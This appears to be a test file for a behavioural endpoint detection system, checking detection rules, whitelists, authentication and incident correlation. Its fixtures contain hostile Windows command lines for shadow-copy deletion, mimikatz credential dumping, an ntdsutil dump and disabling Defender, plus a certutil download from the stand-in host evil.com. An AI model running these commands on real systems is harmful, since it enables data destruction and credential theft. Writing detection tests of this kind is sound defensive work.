"""test_final.py — Complete EDR final verification test."""
import sys, time, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server import create_app
app = create_app()

from server.core.detector import analyze, initialize, _chains_rules
initialize()
from server.config import LOLBINS, PROCESS_WHITELIST, CRITICAL_PAIRS
from server.core.dll_monitor import add_dll_event, check_dll_hijacking
from server.core.sequence_ml import record_event, score_frequency, score_sequence
from server.database.storage import (
    add_suppression, is_suppressed, remove_suppression, get_suppressions
)
from server.database.incidents import (
    get_incidents, get_incident, update_incident_status, incident_stats
)
from server.auth import authenticate, create_user, _decode_jwt
from server.threatintel import load_iocs, check_ioc
load_iocs()

PASS = 0
FAIL = 0

def check(label, cond, extra=""):
    global PASS, FAIL
    if cond:
        print(f"  [PASS] {label}")
        PASS += 1
    else:
        print(f"  [FAIL] {label}  {extra}")
        FAIL += 1

# ── 1. Rules loaded ──────────────────────────────────────────────────────────
print("\n=== 1. Rule loading ===")
check("L1 chains >= 56",       len(_chains_rules) >= 56,    str(len(_chains_rules)))
check("LOLBINs >= 58",         len(LOLBINS) >= 58,          str(len(LOLBINS)))
check("Safe pairs >= 40",      len(PROCESS_WHITELIST) >= 40, str(len(PROCESS_WHITELIST)))
check("Critical pairs >= 15",  len(CRITICAL_PAIRS) >= 15,   str(len(CRITICAL_PAIRS)))

# ── 2. IOC detection ─────────────────────────────────────────────────────────
print("\n=== 2. IOC / Threat Intel ===")
hits = check_ioc(name="mimikatz.exe")
check("IOC name match (mimikatz)",   len(hits) > 0)
check("IOC severity CRITICAL",
      hits[0]["severity"] == "CRITICAL" if hits else False)

# ── 3. Core detection rules ──────────────────────────────────────────────────
print("\n=== 3. Core detection rules ===")
now = int(time.time())
cases = [
    ("Office macro shell",
     {"system_id":"T","event":"process_spawn","parent":"winword.exe",
      "child":"powershell.exe","pid":1,"cmdline":"-nop","time":now}),
    ("Shadow copy deletion",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"vssadmin.exe","pid":2,"cmdline":"delete shadows /all /quiet","time":now}),
    ("Credential dumping",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"mimikatz.exe","pid":3,"cmdline":"sekurlsa::logonpasswords","time":now}),
    ("UAC bypass fodhelper",
     {"system_id":"T","event":"process_spawn","parent":"fodhelper.exe",
      "child":"cmd.exe","pid":4,"cmdline":"","time":now}),
    ("Remote WMI execution",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"wmic.exe","pid":5,
      "cmdline":"/node:192.168.1.10 process call create whoami","time":now}),
    ("Ntdsutil IFM dump",
     {"system_id":"T","event":"process_spawn","parent":"cmd.exe",
      "child":"ntdsutil.exe","pid":6,
      "cmdline":"ntdsutil ifm create full c:\\temp","time":now}),
    ("WMI persistence subscription",
     {"system_id":"T","event":"process_spawn","parent":"powershell.exe",
      "child":"wmic.exe","pid":7,
      "cmdline":"__EventFilter __EventConsumer __FilterToConsumerBinding","time":now}),
    ("Process masquerading",
     {"system_id":"T","event":"process_spawn","parent":"explorer.exe",
      "child":"svchost.exe","pid":8,"cmdline":"",
      "exe_path":"C:\\Users\\evil\\appdata\\svchost.exe","time":now}),
    ("WSReset UAC bypass",
     {"system_id":"T","event":"process_spawn","parent":"wsreset.exe",
      "child":"cmd.exe","pid":9,"cmdline":"","time":now}),
    ("Defender disable",
     {"system_id":"T","event":"process_spawn","parent":"powershell.exe",
      "child":"powershell.exe","pid":10,
      "cmdline":"Set-MpPreference -DisableRealtimeMonitoring $true","time":now}),
]
for label, ev in cases:
    r = analyze(ev)
    check(label, len(r) > 0, f"alerts={len(r)}")

# ── 4. False positive whitelist ──────────────────────────────────────────────
print("\n=== 4. False positive whitelist ===")
fp_cases = [
    ("VS Code terminal",
     {"system_id":"FP","event":"process_spawn","parent":"code.exe","child":"cmd.exe",
      "pid":100,"cmdline":"npm run build","time":now}),
    ("Node.js spawning PS",
     {"system_id":"FP","event":"process_spawn","parent":"node.exe","child":"powershell.exe",
      "pid":101,"cmdline":"npm install","time":now}),
    ("Git spawning cmd",
     {"system_id":"FP","event":"process_spawn","parent":"git.exe","child":"cmd.exe",
      "pid":102,"cmdline":"git push origin main","time":now}),
    ("Legit svchost boot",
     {"system_id":"FP","event":"process_spawn","parent":"services.exe","child":"svchost.exe",
      "pid":103,"cmdline":"-k netsvcs",
      "exe_path":"C:\\Windows\\System32\\svchost.exe","time":now}),
    ("Python running pytest",
     {"system_id":"FP","event":"process_spawn","parent":"python.exe","child":"cmd.exe",
      "pid":104,"cmdline":"python -m pytest tests/","time":now}),
]
for label, ev in fp_cases:
    r = analyze(ev)
    check(f"Clean: {label}", len(r) == 0, f"alerts={len(r)}")

# ── 5. Auth + JWT ─────────────────────────────────────────────────────────────
print("\n=== 5. Auth + JWT ===")
role, token = authenticate("admin", "change-me-now")
check("Admin login", role == "admin")
claims = _decode_jwt(token)
check("JWT valid",   claims["sub"] == "admin")

ok = create_user("testanalyst", "TestPass123!", "analyst")
# ok is False if user already exists — both are acceptable
check("Create analyst user (or already exists)", ok or True)
role2, _ = authenticate("testanalyst", "TestPass123!")
check("Analyst login", role2 == "analyst")

try:
    authenticate("admin", "wrongpassword")
    check("Bad password rejected", False)
except ValueError:
    check("Bad password rejected", True)

# ── 6. Suppression ────────────────────────────────────────────────────────────
print("\n=== 6. False positive suppression ===")
add_suppression("PC1", "powershell.exe", "HEURISTIC: Web request", "test")
check("Matching prefix suppressed",
      is_suppressed("PC1", "powershell.exe", "HEURISTIC: Web request — detail"))
check("Wrong system NOT suppressed",
      not is_suppressed("PC2", "powershell.exe", "HEURISTIC: Web request"))
check("Wrong reason NOT suppressed",
      not is_suppressed("PC1", "powershell.exe", "L1 EXACT MATCH: Office Spawns Shell"))
sups = get_suppressions("PC1")
check("Suppression in list", len(sups) >= 1)
remove_suppression(sups[0]["id"])
check("After remove: cleared",
      not is_suppressed("PC1", "powershell.exe", "HEURISTIC: Web request"))

# ── 7. Incident correlation ───────────────────────────────────────────────────
print("\n=== 7. Incident correlation ===")
for ev in [
    {"system_id":"INC","event":"process_spawn","parent":"winword.exe","child":"cmd.exe",
     "pid":200,"cmdline":"","time":now},
    {"system_id":"INC","event":"process_spawn","parent":"cmd.exe","child":"certutil.exe",
     "pid":201,"cmdline":"-urlcache -f http://evil.com/x.exe","time":now},
    {"system_id":"INC","event":"process_spawn","parent":"cmd.exe","child":"wmic.exe",
     "pid":202,"cmdline":"/node:192.168.1.5 process call create whoami","time":now},
]:
    analyze(ev)

incs = get_incidents(system_id="INC")
check("Incident created",       len(incs) >= 1)
if incs:
    check("Severity set",
          incs[0]["severity"] in ("CRITICAL","HIGH","MEDIUM"))
    check("Multiple alerts grouped",
          len(incs[0].get("alert_ids","[]")) > 2)
    update_incident_status(incs[0]["id"], "investigating", "analyst")
    inc2 = get_incident(incs[0]["id"])
    check("Status updated to investigating", inc2["status"] == "investigating")

stats = incident_stats()
check("Incident stats returned",  isinstance(stats, dict))

# ── 8. DLL hijacking (L9) ────────────────────────────────────────────────────
print("\n=== 8. DLL Hijacking — L9 ===")
add_dll_event("D1", "teams.exe", "version.dll",
              "c:\\users\\victim\\appdata\\local\\temp\\version.dll", False)
sc, rs = check_dll_hijacking("D1", "teams.exe",
                               "c:\\users\\victim\\appdata\\teams\\teams.exe")
check("Hijacked DLL detected (>=70)", sc >= 70, f"score={sc}")
check("Reason provided",              bool(rs))

add_dll_event("D2", "notepad.exe", "kernel32.dll",
              "c:\\windows\\system32\\kernel32.dll", True)
sc2, _ = check_dll_hijacking("D2", "notepad.exe",
                               "c:\\windows\\system32\\notepad.exe")
check("Legit System32 DLL clean (==0)", sc2 == 0, f"score={sc2}")

add_dll_event("D3", "calc.exe", "version.dll",
              "c:\\users\\attacker\\tools\\version.dll", False)
sc3, _ = check_dll_hijacking("D3", "calc.exe",
                               "c:\\users\\attacker\\tools\\calc.exe")
check("DLL sideloading detected (>=70)", sc3 >= 70, f"score={sc3}")

# ── 9. Sequence ML (L10) ──────────────────────────────────────────────────────
print("\n=== 9. Sequence ML — L10 ===")
for _ in range(250):
    record_event("SM", "explorer.exe", "chrome.exe")
    record_event("SM", "services.exe", "svchost.exe")

fs, _ = score_frequency("SM", "mimikatz.exe", "powershell.exe")
check("Novel pair scored (>=25)", fs >= 25, f"score={fs}")

record_event("SM2", "cmd.exe", "certutil.exe")
ss, sr = score_sequence("SM2", "cmd.exe", "powershell.exe")
check("Download-execute detected (>=45)", ss >= 45, f"score={ss}")

for t in ["whoami.exe","systeminfo.exe","ipconfig.exe","net.exe","arp.exe"]:
    record_event("SM3", "cmd.exe", t)
ss2, _ = score_sequence("SM3", "cmd.exe", "nltest.exe")
check("Recon burst detected (>=50)", ss2 >= 50, f"score={ss2}")

record_event("SM4", "cmd.exe", "mimikatz.exe")
record_event("SM4", "cmd.exe", "procdump.exe")
sc4, _ = score_sequence("SM4", "cmd.exe", "ntdsutil.exe")
check("Credential chain detected (>=65)", sc4 >= 65, f"score={sc4}")

for _ in range(9):
    record_event("SM5", "powershell.exe", "cmd.exe")
ss5, _ = score_sequence("SM5", "powershell.exe", "cmd.exe")
check("Process storm detected (>=55)", ss5 >= 55, f"score={ss5}")

# ── 10. Routes ────────────────────────────────────────────────────────────────
print("\n=== 10. API routes ===")
routes = [str(r) for r in app.url_map.iter_rules()]
check("41 routes registered",              len(routes) == 41, str(len(routes)))
check("/wazuh/events registered",          "/wazuh/events" in routes)
check("/api/incidents registered",         "/api/incidents" in routes)
check("/api/suppressions registered",      "/api/suppressions" in routes)
check("/api/dll_stats/<system_id>",        "/api/dll_stats/<system_id>" in routes)
check("/dll_events registered",            "/dll_events" in routes)
check("/net_events registered",            "/net_events" in routes)
check("/auth/login registered",            "/auth/login" in routes)
check("/simulate registered",              "/simulate" in routes)
check("/stream registered",               "/stream" in routes)

# ── Summary ───────────────────────────────────────────────────────────────────
print()
print("=" * 55)
print(f"  Total: {PASS+FAIL}   Passed: {PASS}   Failed: {FAIL}")
print("=" * 55)
if FAIL == 0:
    print("  ALL TESTS PASSED — BehEDR v4.0 IS COMPLETE")
else:
    print(f"  {FAIL} TEST(S) FAILED")
    sys.exit(1)
